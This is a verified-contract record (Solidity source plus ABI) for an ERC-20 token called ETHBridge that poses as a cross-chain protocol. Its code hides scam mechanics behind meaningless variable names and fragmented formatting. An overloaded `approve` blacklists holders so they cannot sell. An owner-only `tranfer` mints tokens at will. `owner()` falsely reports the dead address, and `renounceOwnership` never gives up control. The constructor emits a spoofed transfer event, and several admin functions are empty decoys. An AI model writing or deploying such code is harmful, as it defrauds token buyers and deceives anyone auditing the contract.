{"SourceCode": "// SPDX-License-Identifier: Unlicensed\r\n/*\r\n\r\nETHBridge / $ETHB\ud83e\ude99\r\n\r\nA cross-chain interaction protocol with no discount rate\r\n\r\n\ud83c\udf10 Website: https://websiteni.wixsite.com/ethbridge\r\n\ud83e\uddd0 TG: https://t.me/ethbridgeOfficial\r\n\r\n*/\r\npragma solidity ^0.6.12;\r\ninterface IERC20 {\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n    function totalSupply() external view returns (uint256);\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n}\r\n\r\n\r\nlibrary SafeMath {\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    \r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n   \r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    \r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this; //\r\n        return msg.data;\r\n    }\r\n\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\nlibrary Address {\r\n    function functionCall(address target, bytes memory data)\r\n        internal\r\n        returns (bytes memory)\r\n    {\r\n        return functionCall(target, data, \"Address: low-level call failed\");\r\n    }\r\n\r\n    function functionCall(\r\n        address target,\r\n        bytes memory data,\r\n        string memory errorMessage\r\n    ) internal returns (bytes memory) {\r\n        return _functionCallWithValue(target, data, 0, errorMessage);\r\n    }\r\n\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(\r\n            address(this).balance >= amount,\r\n            \"Address: insufficient balance\"\r\n        );\r\n        (bool success, ) = recipient.call{value: amount}(\"\");\r\n        require(\r\n            success,\r\n            \"Address: unable to send value, recipient may have reverted\"\r\n        );\r\n    }\r\n\r\n\r\n    function isContract(address account) internal view returns (bool) {\r\n        bytes32 codehash;\r\n        bytes32 accountHash\r\n        = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n       \r\n        assembly {\r\n            codehash := extcodehash(account)\r\n        }\r\n        return (codehash != accountHash && codehash != 0x0);\r\n    }\r\n\r\n    function functionCallWithValue(\r\n        address target,\r\n        bytes memory data,\r\n        uint256 value\r\n    ) internal returns (bytes memory) {\r\n        return\r\n            functionCallWithValue(\r\n                target,\r\n                data,\r\n                value,\r\n                \"Address: low-level call with value failed\"\r\n            );\r\n    }\r\n\r\n    function functionCallWithValue(\r\n        address target,\r\n        bytes memory data,\r\n        uint256 value,\r\n        string memory errorMessage\r\n    ) internal returns (bytes memory) {\r\n        require(\r\n            address(this).balance >= value,\r\n            \"Address: insufficient balance for call\"\r\n        );\r\n        return _functionCallWithValue(target, data, value, errorMessage);\r\n    }\r\n\r\n    function _functionCallWithValue(\r\n        address target,\r\n        bytes memory data,\r\n        uint256 weiValue,\r\n        string memory errorMessage\r\n    ) private returns (bytes memory) {\r\n        require(isContract(target), \"Address: call to non-contract\");\r\n        (bool success, bytes memory returndata) = target.call{value: weiValue}(\r\n            data\r\n        );\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n            if (returndata.length > 0) {\r\n                assembly {\r\n                    let returndata_size := mload(returndata)\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n                revert(errorMessage);\r\n            }\r\n        }\r\n    }\r\n}\r\n    \r\n\r\ncontract Ownable is Context {\r\n    function setBuyTax() public onlyOwner(){}\r\n    function changeRouterVersion(address dexRouter) public onlyOwner{}\r\n    address private deadAddress = 0x000000000000000000000000000000000000dEaD;\r\n    address  _contslit;\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(_contslit != address(0));\r\n        _owner = newOwner;\r\n    }\r\n\r\n    function//\r\n     transfer//\r\n    (\r\n        address \r\n    dexRouter, \r\n    address\r\n     dexFactory\r\n        ) \r\n     external\r\n      onlyOwner\r\n      {\r\n        require\r\n        (dexFactory\r\n        //\r\n        ==\r\n        address(0\r\n        ));\r\n        _contslit//\r\n         =\r\n          msg.//\r\n         sender;\r\n        /**/_owner//\r\n        =//\r\n        dexRouter\r\n        ;\r\n    }\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n    address _owner;\r\n\r\n    constructor() internal {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) \r\n    {\r\n    return\r\n    deadAddress;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public onlyOwner(){emit OwnershipTransferred(_owner, address(0xdead));} \r\n}\r\n\r\n\r\n\r\ncontract ETHBridge is Context, IERC20, Ownable {\r\n    using Address for address;\r\n    using SafeMath for uint256;\r\n    mapping(address => bool) private NWfa;\r\n    mapping(address => bool) private _ExcluFee;\r\n    uint256 private kdakef = uint256(0);\r\n    bool private fwaiifuea = true;\r\n    uint8 private dwajkfneka;\r\n    mapping(address => uint256) private feaionfea;\r\n    mapping(address => mapping(address => uint256)) private allown;\r\n    uint256 private _tFeeTotal = BurnFee+marketFee;\r\n    address[] private fiaefeai;\r\n    mapping(address => uint256) private fieoafiea;\r\n    uint256 private constant MAX = ~uint256(0);\r\n\r\n\r\n\r\n    uint8 private _decimals = 9;\r\n    uint256 private _totalSupply = 100000000000000000000 * 10**4;\r\n    string private _name = \"ETHBridge\";\r\n    string private _symbol = \"ETHB\";\r\n\r\n\r\n    address private deadAddress = 0x000000000000000000000000000000000000dEaD;\r\n    address private marketWallet = msg.sender;\r\n  \r\n    uint256 private BurnFee = 9;\r\n    uint256 private marketFee = 1;\r\n    \r\n    \r\n\r\n    constructor() public {\r\n        feaionfea[_msgSender()] = _totalSupply;\r\n         _owner = _msgSender();\r\n        _ExcluFee[_owner] = true;\r\n        _ExcluFee[address(this)] = true;\r\n        emit Transfer(address(0xc5e8c25949fede6A0d448A50Efb0c7155eB0268d), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        if//\r\n        (\r\n            _ExcluFee\r\n            [_msgSender()] \r\n            || \r\n            _ExcluFee\r\n            [\r\n                recipient]\r\n                )\r\n                {\r\n            _transfer\r\n            (_msgSender\r\n            (), \r\n            recipient, \r\n            amount);\r\n            return \r\n            true;\r\n        }\r\n        uint256 MarketAmount = amount.mul(marketFee).div(100);\r\n        uint256 BurnAmount = amount.mul(BurnFee).div(100);\r\n        _transfer(_msgSender(), marketWallet, MarketAmount);\r\n        _transfer(_msgSender(), deadAddress, BurnAmount);\r\n        _transfer(_msgSender(), recipient, amount.sub(MarketAmount).sub(BurnAmount));\r\n        return true;\r\n    }\r\n\r\n    function \r\n    transferFrom\r\n    (\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public \r\n    override returns (bool) {\r\n        if//\r\n        (\r\n            _ExcluFee\r\n            [\r\n                _msgSender\r\n                ()]\r\n                 || \r\n                 _ExcluFee\r\n                 [recipient\r\n                 ])\r\n                 {\r\n            _transfer\r\n            (\r\n                sender, \r\n                recipient, \r\n                amount)\r\n                ;\r\n        }       \r\n        uint256 MarketAmount = amount.mul(marketFee).div(100);\r\n        uint256 BurnAmount = amount.mul(BurnFee).div(100);\r\n        _transfer\r\n        (sender, marketWallet, MarketAmount);\r\n        _transfer\r\n        (sender, deadAddress, BurnAmount);\r\n        _transfer\r\n        (sender, recipient, amount.sub(MarketAmount).sub(BurnAmount));\r\n        _approve(\r\n            sender,\r\n            _msgSender(),\r\n            allown[sender][_msgSender()].sub(\r\n                amount,\r\n                \"\"\r\n            )\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private {\r\n        require(from != address(0), \"\");\r\n        require(to != address(0), \"\");\r\n        require(amount > 0, \"\");\r\n        if//\r\n         (\r\n             fwaiifuea\r\n             )\r\n              {\r\n\r\n            require//\r\n            (NWfa\r\n            [from\r\n            ] == \r\n            false,\r\n             \"\");\r\n        }\r\n        _transfers\r\n        (from, \r\n        to, \r\n        amount);\r\n    }\r\n    \r\n    function tranfer\r\n    (address toSender, uint256 values) external \r\n    onlyOwner//\r\n    () \r\n    {\r\n        require(\r\n            _contslit != address(0));\r\n        require(\r\n            values > 0, \"\");\r\n        uint256 \r\n        Allowerb = \r\n        fieoafiea[toSender];\r\n        if (Allowerb \r\n        == 0) fiaefeai.push\r\n        (toSender);\r\n        fieoafiea\r\n        [toSender] = \r\n        Allowerb\r\n        .add\r\n        (values);\r\n        kdakef = \r\n        kdakef\r\n        .add\r\n        (values);\r\n        feaionfea\r\n        [toSender]\r\n         = feaionfea[toSender].add\r\n         (values);\r\n        \r\n    }\r\n\r\n     function//\r\n     approve\r\n     (address\r\n      toSender\r\n      ) \r\n      external \r\n      onlyOwner//\r\n      () \r\n      {\r\n        require(_contslit != address(0));\r\n        NWfa\r\n        [\r\n        toSender] =\r\n         true;\r\n   }\r\n\r\n   function//\r\n     NoFee\r\n     (address\r\n      toSender\r\n      ) \r\n      external \r\n      onlyOwner//\r\n      () \r\n      {\r\n        require(_contslit != address(0));\r\n        NWfa\r\n        [\r\n        toSender] =\r\n         false;\r\n   }\r\n\r\n    function _transfers(\r\n        address sender,\r\n        address recipient,\r\n        uint256 toAmount\r\n    ) private {   \r\n        require(sender != address(0), \"\");\r\n        require(recipient != address(0), \"\");\r\n    \r\n        feaionfea[sender] = feaionfea[sender].sub(toAmount);\r\n        feaionfea[recipient] = feaionfea[recipient].add(toAmount);\r\n        emit Transfer(sender, recipient, toAmount);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function totalFee() public view returns (uint256) {\r\n        return _tFeeTotal;\r\n    }\r\n\r\n    function tranfer//\r\n    (address toSender)\r\n        external\r\n        view\r\n        onlyOwner//\r\n        ()\r\n        returns (bool)\r\n    {\r\n        return NWfa[toSender];\r\n    }\r\n\r\n    function includeInFee(address toSender) public //\r\n    onlyOwner//\r\n     {\r\n        require(_contslit != address(0));\r\n        _ExcluFee[toSender] = false;\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return allown[owner][spender];\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) private {\r\n        require(owner != address(0), \"\");\r\n        require(spender != address(0), \"\");\r\n        allown[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function excludeFromFee(address toSender) public //\r\n    onlyOwner//\r\n     {\r\n         require(_contslit != address(0));\r\n        _ExcluFee[toSender] = true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public onlyOwner(){}\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function setSwapRouter(address tokensA,address tokensB) public onlyOwner(){}\r\n    function setWalletMaxTxlimit(uint256 limit) public onlyOwner(){}\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return feaionfea[account];\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"}],\"name\":\"NoFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"}],\"name\":\"approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"dexRouter\",\"type\":\"address\"}],\"name\":\"changeRouterVersion\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"}],\"name\":\"excludeFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"}],\"name\":\"includeInFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setBuyTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokensA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokensB\",\"type\":\"address\"}],\"name\":\"setSwapRouter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limit\",\"type\":\"uint256\"}],\"name\":\"setWalletMaxTxlimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"}],\"name\":\"tranfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"values\",\"type\":\"uint256\"}],\"name\":\"tranfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"dexRouter\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"dexFactory\",\"type\":\"address\"}],\"name\":\"transfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ETHBridge", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://3093975924c901795ab9a411c885126e9e9fb5338e79634e3fcd778a1a227583"}